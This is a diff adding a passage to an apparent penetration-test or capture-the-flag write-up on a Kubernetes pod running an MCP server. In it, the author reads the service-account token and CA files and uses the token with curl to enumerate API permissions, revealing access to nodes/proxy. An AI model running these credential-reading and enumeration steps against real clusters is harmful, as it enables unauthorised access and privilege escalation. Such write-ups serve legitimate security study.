@@ -659,5 +659,58 @@ lrwxrwxrwx 1 root root   12 Aug 24 15:06 token -> ..data/token
 
 This information found in this directory will be important, and as seen i have a full permissions on these files
 
+```python
+mcp@mcp-server-54464cb475-29ztf:~$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+mcp@mcp-server-54464cb475-29ztf:~$ CA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt)
+mcp@mcp-server-54464cb475-29ztf:~$ NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
+```
+
+Ill export all these values as variables
+
+```python
+mcp@mcp-server-54464cb475-29ztf:~$ curl -X POST -ks https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --data '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' | python3 -m json.tool
+{
+    "kind": "SelfSubjectRulesReview",
+    "apiVersion": "authorization.k8s.io/v1",
+    "metadata": {},
+    "spec": {},
+    "status": {
+        "resourceRules": [
+            {
+                "verbs": [
+                    "create"
+                ],
+                "apiGroups": [
+                    "authorization.k8s.io"
+                ],
+                "resources": [
+                    "selfsubjectaccessreviews",
+                    "selfsubjectrulesreviews"
+                ]
+            },
+            {
+                "verbs": [
+                    "create"
+                ],
+                "apiGroups": [
+                    "authentication.k8s.io"
+                ],
+                "resources": [
+                    "selfsubjectreviews"
+                ]
+            },
+            {
+                "verbs": [
+                    "get"
+                ],
+                "apiGroups": [
+                    ""
+                ],
+                "resources": [
+                    "nodes/proxy"
+                ]
+            }
+```
+
 
 
